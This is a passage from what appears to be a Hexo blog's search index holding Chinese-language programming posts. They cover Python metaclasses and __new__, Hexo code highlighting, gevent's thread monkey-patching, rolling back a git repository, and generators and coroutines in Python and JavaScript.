            raise RuntimeError(&#39;不支持的整型数据长度：%d&#39; % size)

    @classmethod
    def unpack_from(cls, str, net_order=True):
        obj = cls()
        obj.unpack(str, net_order)
        return int(obj)

class ArrayTypeBase(object):
    &#39;&#39;&#39;数组类型基类
    &#39;&#39;&#39;
    def __init__(self, val=&#39;&#39;):
        init_val = 0
        if isinstance(val, int): 
            init_val = val
        else:
            val = str(val)
        self._obj_array = [self.obj_type(init_val) for _ in range(self.array_size)]  # 初始化
        self.value = val

    def __str__(self):
        return str(self.value)

    def __repr__(self):
        return repr(self.value)

    def __getitem__(self, idx):
        return self._obj_array[idx].value

    def __setitem__(self, idx, val):
        self._obj_array[idx].value = val

    def __getslice__(self, i, j):
        result = [obj.value for obj in self._obj_array[i:j]]
        if self.obj_type == c_ubyte:
            result = [chr(val) for val in result]
            result = &#39;&#39;.join(result)
        return result

    def __add__(self, oval):
        if not isinstance(oval, str):
            raise NotImplementedError(&#39;%s还不支持%s类型&#39; % (self.__class__.__name__, type(oval)))
        return self.value + oval

    def __radd__(self, oval):
        return oval + self.value

    def __iter__(self):
        &#39;&#39;&#39;迭代器
        &#39;&#39;&#39;
        for i in range(self.length):
            yield self[i]

    @property
    def value(self):
        result = [obj.value for obj in self._obj_array]
        if self.obj_type == c_ubyte:
            result = [chr(val) for val in result]
            result = &#39;&#39;.join(result)
        return result

    @value.setter
    def value(self, val):
        if isinstance(val, list):
            raise NotImplementedError(&#39;ArrayType还不支持list&#39;)
        elif isinstance(val, str):
            self.unpack(val)

    def unpack(self, buff, net_order=True):
        &#39;&#39;&#39;
        &#39;&#39;&#39;
        if len(buff) == 0: return
        if len(buff) &lt; self.size: raise ValueError(&#39;unpack数据长度错误：%d %d&#39; % (len(buff), self.size))
        for i in range(self.array_size):
            self._obj_array[i].unpack(buff[i * self.obj_type.size:], net_order)

    def pack(self, net_order=True):
        &#39;&#39;&#39;
        &#39;&#39;&#39;
        result = &#39;&#39;
        for i in range(self.array_size):
            result += self._obj_array[i].pack()
        return result

class c_uint8(IntTypeBase):
    &#39;&#39;&#39;unsigned char
    &#39;&#39;&#39;
    size = 1
    format = &#39;!B&#39;

class c_uint16(IntTypeBase):
    &#39;&#39;&#39;unsigned short
    &#39;&#39;&#39;
    size = 2
    format = &#39;!H&#39;

class c_uint32(IntTypeBase):
    &#39;&#39;&#39;unsigned int32
    &#39;&#39;&#39;
    size = 4
    format = &#39;!I&#39;

class c_uint64(IntTypeBase):
    &#39;&#39;&#39;unsigned int64
    &#39;&#39;&#39;
    size = 8
    format = &#39;!Q&#39;


cls = c_ubyte * 5
print(cls)
val = cls(65)
print(val)
</code></pre>
<p>以上代码在Python2.7中输出结果如下：</p>
<pre><code>
&lt;class &#39;__main__.c_ubyte_Array_5&#39;&gt;
AAAAA

</code></pre><p>在Python3中，<code>metaclass</code>的定义方法做了修改，变成了：</p>
<pre><code class="python">
class IntTypeBase(object, metaclass=MetaClass):
    pass

</code></pre>
<p>为了兼容性。可以使用<code>six</code>库中的方法：</p>
<pre><code class="python">
import six

@six.add_metaclass(MetaClass)
class IntTypeBase(object):
    pass

</code></pre>
<p>使用元类的优点是可以使用更加优雅的方式创建类，如上面的<code>c_ubyte * 5</code>，提升了代码可读性和技巧性。</p>
<h1 id="0x04-重写-new-方法"><a href="#0x04-重写-new-方法" class="headerlink" title="0x04 重写__new__方法"></a>0x04 重写<code>__new__</code>方法</h1><p>每个继承自<code>object</code>的类都有<code>__new__</code>方法，这是个在类实例化时优先调用的方法，时机早于<code>__init__</code>。它返回的类型决定了最终创建出来的对象的类型。</p>
<p>请看以下代码：</p>
<pre><code class="python">
class A(object):
    def __new__(self, *args, **kwargs):
        return B()

class B(object):
    pass

a = A()
print(a)

</code></pre>
<p>输出结果如下：</p>
<pre><code>&lt;__main__.B object at 0x023576D0&gt;
</code></pre><p>可以看到，明明实例化的是<code>A</code>，但是返回的对象类型却是<code>B</code>，这里主要就是<code>__new__</code>在起作用。</p>
<p>下面的例子展示了在<code>__new__</code>中动态创建类的过程：</p>
<pre><code class="python">
class B(object):
    def __init__(self, var):
        self._var = var

    def test(self):
        print(self._var)

class A(object):
    def __new__(self, *args, **kwargs):
        if len(args) == 1 and isinstance(args[0], type):
            return type(&#39;%s_%s&#39; % (self.__name__, args[0].__name__), (self, args[0]), {})
        else:
            return object.__new__(self, *args, **kwargs)

    def output(self):
        print(&#39;output from new class %s&#39; % self.__class__.__name__)

obj = A(B)(&#39;Hello World&#39;)
obj.test()
obj.output()

</code></pre>
<p>结果输出如下：</p>
<pre><code>Hello World
output from new class A_B
</code></pre><p>这个例子实现了动态创建两个类的子类，比较适合存在很多类需要排列组合生成N多子类的场景，可以避免要写一堆子类代码的痛苦。</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>动态创建类必须要使用<code>type</code>实现，但是，根据不同的使用场景，可以选择不同的使用方法。</p>
<p>这样做对静态分析工具其实是不友好的，因为在运行过程中类型发生了变化。而且，这也会降低代码的可读性，一般情况下也不推荐用户使用这样存在一定技巧性的代码。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>class</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo主题中设置代码高亮</title>
    <url>/2017/06/03/hexo-set-code-highlight/</url>
    <content><![CDATA[<p>今天，介绍一种在主题中添加<a href="https://github.com/google/code-prettify" target="_blank" rel="noopener">Google Prettify</a>代码高亮的方法。这里以next主题为例，如果对应的目录不存在，可以手动创建，或选择其它目录。</p>
<p>1、 将压缩包<a href="https://raw.githubusercontent.com/google/code-prettify/master/distrib/prettify-small.zip" target="_blank" rel="noopener">https://raw.githubusercontent.com/google/code-prettify/master/distrib/prettify-small.zip</a>下载到本地，解压到主题的lib目录下，目录名为prettify。<br>2、 从<a href="http://jmblog.github.io/color-themes-for-google-code-prettify/" target="_blank" rel="noopener">http://jmblog.github.io/color-themes-for-google-code-prettify/</a>下载自己喜欢的主题文件到lib/prettify/skins目录下。<br>3、 在主题的layout/_third-party目录下创建prettify.swig文件，内容如下：</p>
<pre><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;/lib/prettify/skins/{{ theme.custom_highlight_theme }}.css&quot; type=&quot;text/css&quot;&gt;
&lt;script src=&quot;/lib/prettify/prettify.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
  $(document).ready(function() {
      $(&#39;pre&#39;).addClass(&#39;prettyprint linenums&#39;).attr(&#39;style&#39;, &#39;overflow:auto;&#39;);
      prettyPrint();
  });
&lt;/script&gt;

</code></pre><p>4、 修改主题layout目录下的_layout.swig文件（只要是会被所有文件加载的地方都可以），在合适的地方（最好是最后）添加：  </p>
<pre><code>{% include '_third-party/prettify.swig' %}
</code></pre><p>5、 修改主题的_config.yml文件，添加一行： </p>
<pre><code>    custom_highlight_theme: theme_name
</code></pre><p>   theme_name是要使用主题名，也就是下载的css文件名。本来想复用next中自带的highlight_theme字段，但是改成其它主题名字后运行hexo会报错，只好新建了一个字段。</p>
<p>参考链接：</p>
<blockquote>
<p><a href="https://liuzhichao.com/2016/hexo-use-prettify-to-highlight-code.html" target="_blank" rel="noopener">https://liuzhichao.com/2016/hexo-use-prettify-to-highlight-code.html</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>gevent初探</title>
    <url>/2020/02/18/gevent/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有很多Python语言的协程库，如：tornado、asyncio等。这些库在使用时需要使用特定的语法，如：async/await，对于非协程的代码需要改写才能以协程方式运行。</p>
<p>gevent是一个特殊的协程库，它可以将非协程代码以协程方式运行，从而起到提升性能的作用。本文尝试分析一下它的实现原理。</p>
<h2 id="0x01-使用案例"><a href="#0x01-使用案例" class="headerlink" title="0x01 使用案例"></a>0x01 使用案例</h2><p>先看以下这段代码：</p>
<pre><code class="python">import ctypes
import sys
import threading
import time

def gettid():
    if sys.platform == &#39;linux2&#39;:
        return ctypes.CDLL(&#39;libc.so.6&#39;).syscall(186)
    else:
        return ctypes.windll.kernel32.GetCurrentThreadId()

def thread_test(index):
    time0 = time.time()
    while time.time() - time0 &lt; 1:
        print(&#39;I\&#39;m thread %d: %d %d&#39; % (index, threading.current_thread().ident, gettid()))
        time.sleep(0.1)

thread1 = threading.Thread(target=thread_test, args=(1,))
thread1.start()

thread2 = threading.Thread(target=thread_test, args=(2,))
thread2.start()
print(&#39;Main thread sleep&#39;)
time.sleep(2)
print(&#39;Main thread exit&#39;)
</code></pre>
<p>输出内容如下：</p>
<pre><code>I&#39;m thread 1: 140540774946560 32347
I&#39;m thread 2: 140540766553856 32348
Main thread sleep
I&#39;m thread 1: 140540774946560 32347
I&#39;m thread 2: 140540766553856 32348
I&#39;m thread 1: 140540774946560 32347
I&#39;m thread 2: 140540766553856 32348
I&#39;m thread 1: 140540774946560 32347
I&#39;m thread 2: 140540766553856 32348
I&#39;m thread 1: 140540774946560 32347
I&#39;m thread 2: 140540766553856 32348
I&#39;m thread 1: 140540774946560 32347
I&#39;m thread 2: 140540766553856 32348
I&#39;m thread 1: 140540774946560 32347
I&#39;m thread 2: 140540766553856 32348
I&#39;m thread 1: 140540774946560 32347
I&#39;m thread 2: 140540766553856 32348
I&#39;m thread 1: 140540774946560 32347
I&#39;m thread 2: 140540766553856 32348
I&#39;m thread 1: 140540774946560 32347
I&#39;m thread 2: 140540766553856 32348
Main thread exit
</code></pre><p>在这段代码前面加上以下代码：</p>
<pre><code class="python">from gevent import monkey
monkey.patch_thread()
</code></pre>
<p>输出如下：</p>
<pre><code>I&#39;m thread 1: 21069936 31623
I&#39;m thread 1: 21069936 31623
I&#39;m thread 1: 21069936 31623
I&#39;m thread 1: 21069936 31623
I&#39;m thread 1: 21069936 31623
I&#39;m thread 1: 21069936 31623
I&#39;m thread 1: 21069936 31623
I&#39;m thread 1: 21069936 31623
I&#39;m thread 1: 21069936 31623
I&#39;m thread 1: 21069936 31623
I&#39;m thread 2: 14522208 31623
I&#39;m thread 2: 14522208 31623
I&#39;m thread 2: 14522208 31623
I&#39;m thread 2: 14522208 31623
I&#39;m thread 2: 14522208 31623
I&#39;m thread 2: 14522208 31623
I&#39;m thread 2: 14522208 31623
I&#39;m thread 2: 14522208 31623
I&#39;m thread 2: 14522208 31623
I&#39;m thread 2: 14522208 31623
Main thread sleep
Main thread exit
</code></pre><p>可以看出，在加入gevent后，输出与之前有些不同，最大的区别是：<code>两个线程具有相同的线程ID</code>。也就是说，这两个线程其实是跑在同一个线程里的。</p>
<p>还有一点需要注意的地方：<code>Main thread sleep</code>这句输出在前后两次执行是不同的。</p>
<h2 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h2><p>来看下<code>patch_thread</code>函数的实现：</p>
<pre><code class="python">def patch_thread(threading=True, _threading_local=True, Event=True, logging=True,
                 existing_locks=True,
                 _warnings=None):
    if threading:
        threading_mod = __import__(&#39;threading&#39;)
        # Capture the *real* current thread object before
        # we start returning DummyThread objects, for comparison
        # to the main thread.
        orig_current_thread = threading_mod.current_thread()
    else:
        threading_mod = None
        gevent_threading_mod = None
        orig_current_thread = None

    gevent_thread_mod, thread_mod = _patch_module(&#39;thread&#39;,
                                                  _warnings=_warnings, _notify_did_subscribers=False)

    if threading:
        gevent_threading_mod, _ = _patch_module(&#39;threading&#39;,
                                                _warnings=_warnings, _notify_did_subscribers=False)

        if Event:
            from gevent.event import Event
            patch_item(threading_mod, &#39;Event&#39;, Event)
            # Python 2 had `Event` as a function returning
            # the private class `_Event`. Some code may be relying
            # on that.
            if hasattr(threading_mod, &#39;_Event&#39;):
                patch_item(threading_mod, &#39;_Event&#39;, Event)

        if existing_locks:
            _patch_existing_locks(threading_mod)

        if logging and &#39;logging&#39; in sys.modules:
            logging = __import__(&#39;logging&#39;)
            patch_item(logging, &#39;_lock&#39;, threading_mod.RLock())
            for wr in logging._handlerList:
                # In py26, these are actual handlers, not weakrefs
                handler = wr() if callable(wr) else wr
                if handler is None:
                    continue
                if not hasattr(handler, &#39;lock&#39;):
                    raise TypeError(&quot;Unknown/unsupported handler %r&quot; % handler)
                handler.lock = threading_mod.RLock()

    if _threading_local:
        _threading_local = __import__(&#39;_threading_local&#39;)
        from gevent.local import local
        patch_item(_threading_local, &#39;local&#39;, local)

    def make_join_func(thread, thread_greenlet):
        from gevent.hub import sleep
        from time import time

        def join(timeout=None):
            end = None
            if threading_mod.current_thread() is thread:
                raise RuntimeError(&quot;Cannot join current thread&quot;)
            if thread_greenlet is not None and thread_greenlet.dead:
                return
            if not thread.is_alive():
                return

            if timeout:
                end = time() + timeout

            while thread.is_alive():
                if end is not None and time() &gt; end:
                    return
                sleep(0.01)
        return join

    if threading:
        from gevent.threading import main_native_thread

        for thread in threading_mod._active.values():
            if thread == main_native_thread():
                continue
            thread.join = make_join_func(thread, None)

    if sys.version_info[:2] &gt;= (3, 4):

        # Issue 18808 changes the nature of Thread.join() to use
        # locks. This means that a greenlet spawned in the main thread
        # (which is already running) cannot wait for the main thread---it
        # hangs forever. We patch around this if possible. See also
        # gevent.threading.
        greenlet = __import__(&#39;greenlet&#39;)

        if orig_current_thread == threading_mod.main_thread():
            main_thread = threading_mod.main_thread()
            _greenlet = main_thread._greenlet = greenlet.getcurrent()

            main_thread.join = make_join_func(main_thread, _greenlet)

            # Patch up the ident of the main thread to match. This
            # matters if threading was imported before monkey-patching
            # thread
            oldid = main_thread.ident
            main_thread._ident = threading_mod.get_ident()
            if oldid in threading_mod._active:
                threading_mod._active[main_thread.ident] = threading_mod._active[oldid]
            if oldid != main_thread.ident:
                del threading_mod._active[oldid]
        else:
            _queue_warning(&quot;Monkey-patching not on the main thread; &quot;
                           &quot;threading.main_thread().join() will hang from a greenlet&quot;,
                           _warnings)

    from gevent import events
    _notify_patch(events.GeventDidPatchModuleEvent(&#39;thread&#39;, gevent_thread_mod, thread_mod))
    _notify_patch(events.GeventDidPatchModuleEvent(&#39;threading&#39;, gevent_threading_mod, threading_mod))
</code></pre>
<p>首先，<code>orig_current_thread</code>变量存储了当前的线程对象，然后调用<code>_patch_module</code>函数<code>patch</code>了<code>threading</code>和<code>thread</code>模块。</p>
<p><code>_patch_module</code>函数相关实现如下：</p>
<pre><code class="python">def __call_module_hook(gevent_module, name, module, items, _warnings):
    # This function can raise DoNotPatch on &#39;will&#39;

    def warn(message):
        _queue_warning(message, _warnings)

    func_name = &#39;_gevent_&#39; + name + &#39;_monkey_patch&#39;
    try:
        func = getattr(gevent_module, func_name)
    except AttributeError:
        func = lambda *args: None


    func(module, items, warn)

def patch_item(module, attr, newitem):
    olditem = getattr(module, attr, _NONE)
    if olditem is not _NONE:
        saved.setdefault(module.__name__, {}).setdefault(attr, olditem)
    setattr(module, attr, newitem)

def patch_module(target_module, source_module, items=None,
                 _warnings=None,
                 _notify_did_subscribers=True):
    &quot;&quot;&quot;
    patch_module(target_module, source_module, items=None)

    Replace attributes in *target_module* with the attributes of the
    same name in *source_module*.

    The *source_module* can provide some attributes to customize the process:

    * ``__implements__`` is a list of attribute names to copy; if not present,
      the *items* keyword argument is mandatory.
    * ``_gevent_will_monkey_patch(target_module, items, warn, **kwargs)``
    * ``_gevent_did_monkey_patch(target_module, items, warn, **kwargs)``
      These two functions in the *source_module* are called *if* they exist,
      before and after copying attributes, respectively. The &quot;will&quot; function
      may modify *items*. The value of *warn* is a function that should be called
      with a single string argument to issue a warning to the user. If the &quot;will&quot;
      function raises :exc:`gevent.events.DoNotPatch`, no patching will be done. These functions
      are called before any event subscribers or plugins.

    :keyword list items: A list of attribute names to replace. If
       not given, this will be taken from the *source_module* ``__implements__``
       attribute.
    :return: A true value if patching was done, a false value if patching was canceled.

    .. versionadded:: 1.3b1
    &quot;&quot;&quot;
    from gevent import events

    if items is None:
        items = getattr(source_module, &#39;__implements__&#39;, None)
        if items is None:
            raise AttributeError(&#39;%r does not have __implements__&#39; % source_module)

    try:
        __call_module_hook(source_module, &#39;will&#39;, target_module, items, _warnings)
        _notify_patch(
            events.GeventWillPatchModuleEvent(target_module.__name__, source_module,
                                              target_module, items),
            _warnings)
    except events.DoNotPatch:
        return False

    for attr in items:
        patch_item(target_module, attr, getattr(source_module, attr))

    __call_module_hook(source_module, &#39;did&#39;, target_module, items, _warnings)

    if _notify_did_subscribers:
        # We allow turning off the broadcast of the &#39;did&#39; event for the benefit
        # of our internal functions which need to do additional work (besides copying
        # attributes) before their patch can be considered complete.
        _notify_patch(
            events.GeventDidPatchModuleEvent(target_module.__name__, source_module,
                                             target_module)
        )

    return True

def _patch_module(name, items=None, _warnings=None, _notify_did_subscribers=True):

    gevent_module = getattr(__import__(&#39;gevent.&#39; + name), name)
    module_name = getattr(gevent_module, &#39;__target__&#39;, name)
    target_module = __import__(module_name)

    patch_module(target_module, gevent_module, items=items,
                 _warnings=_warnings,
                 _notify_did_subscribers=_notify_did_subscribers)

    return gevent_module, target_module
</code></pre>
<p>这里比较关键的逻辑有两个：</p>
<ul>
<li><p>调用<code>__call_module_hook</code>执行目标模块中的<code>_gevent_will_monkey_patch</code>和<code>_gevent_did_monkey_patch</code>方法</p>
</li>
<li><p>调用<code>patch_item</code>将原始模块中的指定方法替换为gevent对应模块中的同名方法</p>
</li>
</ul>
<p>可以看出，patch的关键逻辑就是由<code>patch_item</code>实现的，具体要patch的对象是由gevent模块中的<code>__implements__</code>列表指定的。</p>
<h2 id="0x03-threading模块patch分析"><a href="#0x03-threading模块patch分析" class="headerlink" title="0x03 threading模块patch分析"></a>0x03 threading模块patch分析</h2><p>对于<code>threading</code>模块，对应模块就是<code>gevent.threading</code>，里面实现了<code>_gevent_will_monkey_patch</code>方法，在hook前做一些准备工作。</p>
<pre><code class="python">import threading as __threading__

def _gevent_will_monkey_patch(native_module, items, warn): # pylint:disable=unused-argument
    # Make sure the MainThread can be found by our current greenlet ID,
    # otherwise we get a new DummyThread, which cannot be joined.
    # Fixes tests in test_threading_2 under PyPy.
    main_thread = main_native_thread()
    if __threading__.current_thread() != main_thread:
        warn(&quot;Monkey-patching outside the main native thread. Some APIs &quot;
             &quot;will not be available. Expect a KeyError to be printed at shutdown.&quot;)
        return

    if _get_ident() not in __threading__._active:
        main_id = main_thread.ident
        del __threading__._active[main_id]
        main_thread._ident = main_thread._Thread__ident = _get_ident()
        __threading__._active[_get_ident()] = main_thread
</code></pre>
<p>在<code>gevent.threading</code>模块中要patch的列表是：</p>
<pre><code class="python">__implements__ = [
    &#39;local&#39;,
    &#39;_start_new_thread&#39;,
    &#39;_allocate_lock&#39;,
    &#39;Lock&#39;,
    &#39;_get_ident&#39;,
    &#39;_sleep&#39;,
    &#39;_DummyThread&#39;,
]
</code></pre>
<p>而在<code>gevent.thread</code>模块中则是：</p>
<pre><code class="python">__implements__ = [
    &#39;allocate_lock&#39;,
    &#39;get_ident&#39;,
    &#39;exit&#39;,
    &#39;LockType&#39;,
    &#39;stack_size&#39;,
    &#39;start_new_thread&#39;,
    &#39;_local&#39;
]
</code></pre>
<p>我们来看下<code>threading</code>模块在启动线程过程中做了哪些操作。</p>
<pre><code>  +------------------------+
  |                        |
  | threading.Thread.start |
  |                        |
  +-----------+------------+
              |
              |
              v
+-------------+---------------+
|                             |
| threading._start_new_thread |
|                             |
+-------------+---------------+
              |
              |
              |
              v
  +-----------+-------------+
  |                         |
  | thread.start_new_thread |
  |                         |
  +-------------------------+

</code></pre><p>上面的<code>threading._start_new_thread</code>和<code>thread.start_new_thread</code>都是在gevent的<code>__implements__</code>列表中的。也就是说：这两个函数都被gevent hook了。</p>
<pre><code class="python">from gevent.thread import start_new_thread as _start_new_thread
</code></pre>
<p>而由于<code>gevent.threading._start_new_thread</code>其实就是<code>gevent.thread.start_new_thread</code>，所以它们其实是同一个函数。</p>
<pre><code class="python">def start_new_thread(function, args=(), kwargs=None):
    if kwargs is not None:
        greenlet = Greenlet.spawn(function, *args, **kwargs)
    else:
        greenlet = Greenlet.spawn(function, *args)
    return get_ident(greenlet)
</code></pre>
<p>从<code>start_new_thread</code>函数可以看出，启动线程逻辑已经被替换成了<code>greenlet</code>的实现，这也是为什么使用了<code>patch_thread</code>后，真实线程id相同的原因。</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>gevent使用动态patch的方法，实现了动态将非协程库变成协程库的功能，在极少修改代码的前提下提升了程序的性能。但是，在上面线程的例子中可以看出，patch后程序的行为可能会有一些差异，所以在使用上还是需要小心。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>coroutine</tag>
      </tags>
  </entry>
  <entry>
    <title>git回滚代码</title>
    <url>/2018/05/10/git-rollback/</url>
    <content><![CDATA[<p>有时我们需要回滚git上已经提交的代码，特别是已经提交到<code>github上</code>的代码。可以使用如下步骤：</p>
<p>1、 <code>git reflog</code></p>
<pre><code>$ git reflog
1bd6100 (HEAD -&gt; master) HEAD@{0}: commit: Site updated: 2018-05-10 12:20:40
f681615 HEAD@{1}: commit: Site updated: 2018-04-25 19:31:25
78f096f HEAD@{2}: commit: Site updated: 2018-04-25 19:11:23
14b480b HEAD@{3}: commit: Site updated: 2018-04-24 20:01:27
</code></pre><p>2、 <code>git reset --hard version</code></p>
<pre><code>$ git reset --hard f681615
HEAD is now at f681615 Site updated: 2018-04-25 19:31:25
</code></pre><p>3、 <code>git log</code></p>
<pre><code>$ git log
commit f68161540b8c3400c4ab4a35eef67039c732781d (HEAD -&gt; master)
Author: drunkdream &lt;drunkdream@gmail.com&gt;
Date:   Wed Apr 25 19:31:53 2018 +0800

    Site updated: 2018-04-25 19:31:25
</code></pre><p>4、 <code>git push --force</code></p>
<pre><code>$ git push --force
Total 0 (delta 0), reused 0 (delta 0)
To github.com:drunkdream/xxx.git
 + 1bd6100...f681615 master -&gt; master (forced update)
</code></pre>]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Python和JavaScript中的生成器与协程</title>
    <url>/2018/07/18/python-javascript-generator/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Python和JavaScript中都有<code>生成器</code>（<code>Generator</code>）和<code>协程</code>（<code>coroutine</code>）的概念。本文通过分析两者在这两种语言上的使用案例，来对比它们的差异。</p>
<h1 id="0x01-Python中的生成器"><a href="#0x01-Python中的生成器" class="headerlink" title="0x01 Python中的生成器"></a>0x01 Python中的生成器</h1><h2 id="Python中的生成器简介"><a href="#Python中的生成器简介" class="headerlink" title="Python中的生成器简介"></a>Python中的生成器简介</h2><p>使用过Python的同学对生成器的概念应该是很熟悉的，一个经典的例子是使用它生成斐波拉契数列。</p>
<pre><code class="python">def fab(max):
    n, a, b = 0, 0, 1
    while n &lt; max:
        yield b
        a, b = b, a + b
        n = n + 1
</code></pre>
<p>输出结果如下：</p>
<pre><code>&gt;&gt;&gt; for n in fab(5):
...     print n
...
1
1
2
3
5
</code></pre><p>在Python中，使用了<code>yield</code>的函数不再是普通函数，而是一个生成器函数，执行它返回的是一个生成器对象，可以进行迭代，可以调用<code>next</code>函数获取下一个值。</p>
<pre><code>&gt;&gt;&gt; fab
&lt;function fab at 0x0225E4F0&gt;
&gt;&gt;&gt; fab(5)
&lt;generator object fab at 0x0217BE18&gt;
&gt;&gt;&gt; x=fab(5)
&gt;&gt;&gt; x.next()
1
&gt;&gt;&gt; x.next()
1
&gt;&gt;&gt; x.next()
2
&gt;&gt;&gt; x.next()
3
&gt;&gt;&gt; x.next()
5
</code></pre><p><code>yield</code>也支持使用<code>send</code>方法进行参数传递。</p>
<pre><code class="python">def gen_test():
    n = 1
    while True:
        n = yield n
        print n

g = gen_test()
n = g.next()
for i in range(5):
    n = g.send(n * 2)
</code></pre>
<p>输出结果为：</p>
<pre><code>2
4
8
16
32
</code></pre><p>创建生成器函数后，需要先调用一次<code>next</code>函数，否则程序会报以下错误：</p>
<pre><code>TypeError: can&#39;t send non-None value to a just-started generator
</code></pre><p><code>yield</code>最大的特点是允许代码发生中断，并在调用<code>next</code>或<code>send</code>时继续往下执行。</p>
<h2 id="Python中使用生成器实现协程"><a href="#Python中使用生成器实现协程" class="headerlink" title="Python中使用生成器实现协程"></a>Python中使用生成器实现协程</h2><p>协程是一种通过代码实现的模拟多线程并发的逻辑，其特点是使用一个线程实现了原本需要多个线程才能实现的功能；而且由于避免了多线程切换，提升了程序的性能，甚至去掉了多线程中必不可少的互斥锁。</p>
<p>协程最大的一个特点是用同步的方式写异步代码，提升了代码的可读性，并降低了维护成本。</p>
<p>协程与多线程的主要差别如下：</p>
<ol>
<li>协程只有一个线程，多线程有多个线程  </li>
<li>协程中任务（逻辑线程）的切换是在代码中主动进行的；线程的切换是操作系统进行的，时机不可预期  </li>
<li>进程中可以创建的线程数量是有限的，数量多了之后产生的线程切换开销比较大；协程可以创建的任务数量主要受CPU占用率、文件句柄数量等限制</li>
</ol>
<p>由于Python中<code>GIL</code>的存在，多线程实际上并无法利用到多核CPU的优势。这种情况下使用<code>协程 + 多进程</code>无疑是最优实现方案。</p>
<p><code>yield</code>天生的特性，为实现协程提供了极大的便利。</p>
<p> Python中使用生成器实现协程的典型库是：<code>tornado</code>。即便是自己实现也不是很复杂，基本原理就是维护一个事件队列，保存生成器对象，不断取出队列前面的生成器对象，去调用<code>send</code>方法，进行参数传递，从而维护了函数调用链。</p>
<p>下面是使用<code>tornado</code>的一个例子：</p>
<pre><code class="python">
import tornado.gen
import tornado.ioloop
import tornado.tcpclient

@tornado.gen.coroutine
def tcp_client_demo(addr, port):
    tcp_client = tornado.tcpclient.TCPClient()
    stream = yield tcp_client.connect(addr, port, timeout=30)
    stream.write(&#39;send data&#39;)
    buffer = yield stream.read_until(&#39;\r\n\r\n&#39;)
    raise tornado.gen.Return(buffer)

tcp_client_demo(&#39;1.1.1.1&#39;, 1111)
tornado.ioloop.IOLoop.current().start()

</code></pre>
<p>不过<code>tornado</code>中还是有很多地方需要写回调函数的，个人觉得这些地方实现得不是很优雅。</p>
<p>Python从<code>3.5</code>开始支持<code>async</code>和<code>await</code>关键字，从而在语言层面支持了协程。但是使用生成器实现协程的兼容性会更好。</p>
<h1 id="0x02-JavaScript中的生成器"><a href="#0x02-JavaScript中的生成器" class="headerlink" title="0x02 JavaScript中的生成器"></a>0x02 JavaScript中的生成器</h1><h2 id="JavaScript中的生成器简介"><a href="#JavaScript中的生成器简介" class="headerlink" title="JavaScript中的生成器简介"></a>JavaScript中的生成器简介</h2><p>JavaScript中可以使用<code>function*</code>创建生成器函数，这是在<code>ES6</code>规范中提出来的，Chrome从版本<code>39</code>才开始支持这一特性。</p>
<p>使用JavaScript生成斐波拉契数列的代码如下：</p>
<pre><code class="javascript">function* fab(max) {
    var [n, a, b] = [0, 0, 1];
    while(n &lt; max) {
        yield b;
        [a, b] = [b, a + b];
        n++;
    }
}
</code></pre>
<p>执行结果如下：</p>
<pre><code>&gt; x=fab(5)
fab {[[GeneratorStatus]]: &quot;suspended&quot;}
&gt; x.next()
Object {value: 1, done: false}
&gt; x.next()
Object {value: 1, done: false}
&gt; x.next()
Object {value: 2, done: false}
&gt; x.next()
Object {value: 3, done: false}
&gt; x.next()
Object {value: 5, done: false}
</code></pre><p>可以看出，使用方法与Python中是基本一致的，不过，JavaScript中并没有<code>send</code>方法，但是<code>next</code>是可以传参的，相当于结合了Python中<code>next</code>和<code>send</code>的功能。</p>
<h2 id="JavaScript中使用生成器实现协程"><a href="#JavaScript中使用生成器实现协程" class="headerlink" title="JavaScript中使用生成器实现协程"></a>JavaScript中使用生成器实现协程</h2><p>JavaScript天生是一个单线程的环境，一般不能使用阻塞的操作，传统的实现多采用异步回调（<code>callback</code>）方式。但是，这种方式容易导致层层嵌套，变成回调地狱（<code>Callback Hell</code>），阅读和调试都不是很方便。</p>
<p>后来出现了<code>Promise</code>，可以用优雅一些的方法编写异步代码，但是仍然不够优雅。于是出现了基于<code>生成器</code>和<code>Promise</code>实现的<code>co</code>库，这个库目前只有200多行代码，可以将生成器函数变成Promise对象，并自动执行。它支持<code>yield</code>一个<code>Promise</code>对象，其效果与<code>async</code>和<code>await</code>（Chrome <code>55</code>开始支持）相似。</p>
<p><code>co</code>代码链接为：<a href="https://github.com/tj/co/blob/master/index.js" target="_blank" rel="noopener">https://github.com/tj/co/blob/master/index.js</a>。</p>
<p>关于<code>co</code>的具体介绍可以参考<a href="http://www.ruanyifeng.com/blog/2015/05/co.html" target="_blank" rel="noopener">这篇文章</a>。</p>
<p>以下是使用<code>co</code>的一个例子：</p>
<pre><code class="javascript">
function sleep(ms) {
  return new Promise(resolve =&gt; setTimeout(resolve, ms));
}

function* gen_sleep() {
    console.log(new Date());
    yield sleep(2000);
    console.log(new Date());
}

co(gen_sleep);

</code></pre>
<p>执行结果如下：</p>
<pre><code>Wed Jul 18 2018 14:39:44 GMT+0800 (中国标准时间)
Promise {[[PromiseStatus]]: &quot;pending&quot;, [[PromiseValue]]: undefined}
VM514:8 Wed Jul 18 2018 14:39:47 GMT+0800 (中国标准时间)
</code></pre><p>这里两次打印时间差了<code>3秒</code>，怀疑是执行误差所致。使用<code>async</code>和<code>await</code>也是如此，尚未找到具体原因。</p>
<p>如果只是不断调用<code>gen_sleep</code>的<code>next</code>函数，是不会进行<code>sleep</code>操作的。</p>
<p>使用<code>async</code>和<code>await</code>实现以上的功能，代码如下：</p>
<pre><code class="javascript">
